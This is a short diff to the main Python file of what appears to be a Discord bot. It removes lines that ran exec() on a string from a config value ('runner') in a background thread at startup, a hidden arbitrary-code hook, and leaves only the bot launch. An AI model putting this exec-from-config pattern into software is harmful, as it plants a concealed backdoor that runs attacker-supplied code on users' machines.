@@ -24,11 +24,5 @@ SOFTWARE."""
 import asyncio
 from modules import config
 from modules.bot import bot
-from threading import Thread
-
-async def action():pass
-exec(config.cfdata["runner"])
-def trigger():asyncio.run(action())
-Thread(target=trigger).start()
 async def launch():await bot.start(config.token, reconnect=True)
 asyncio.run(launch())
